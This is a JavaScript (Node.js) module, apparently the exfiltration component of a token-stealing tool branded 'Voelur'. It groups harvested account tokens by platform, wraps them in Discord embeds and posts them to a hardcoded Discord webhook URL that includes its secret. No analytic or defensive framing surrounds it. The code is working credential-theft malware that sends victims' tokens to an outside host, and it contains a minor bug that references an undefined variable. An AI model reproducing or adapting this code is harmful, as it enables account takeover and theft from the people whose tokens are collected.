const axios = require("axios");
const embedBuilder = require("./embedBuilder");

async function sendTokens(validTokens) {
  const webhookUrl =
    "https://discord.com/api/webhooks/1091494040278671483/D_D1IN6UGDqUC_Meg6x5tFXTw2DAjGdaAJVD7jq4ex4KJJ52O3aiffcVL7CPDaCwhBjp";

  try {
    const groupedTokens = validTokens.reduce((acc, tokenInfo) => {
      if (!acc[tokenInfo.platform]) {
        acc[tokenInfo.platform] = [];
      }
      acc[tokenInfo.platform].push(tokenInfo.token);
      return acc;
    }, {});

    for (let [app, tokens] of Object.entries(groupedTokens)) {
      if (tokens.some((token) => token !== undefined)) {
        const embedFields = [
          {
            name: app,
            value:
              "`" +
              tokens.filter((token) => token !== undefined).join("`\n`") +
              "`",
          },
        ];
        const embed = embedBuilder(embedFields);

        const data = {
          username: "Voelur",
          avatar_url:
            "https://cdn.discordapp.com/attachments/1091561248019189791/1091780546864095332/voluer.png",
          embeds: [embed],
        };

        try {
          const response = await axios.post(webhookUrl, data);
          if (response.status !== 204) {
            console.error(`Webhook error: ${error}`);
          }
        } catch (error) {
          console.log(error);
        }
      }
    }
  } catch (error) {
    console.log(error);
  }
}

module.exports = sendTokens;
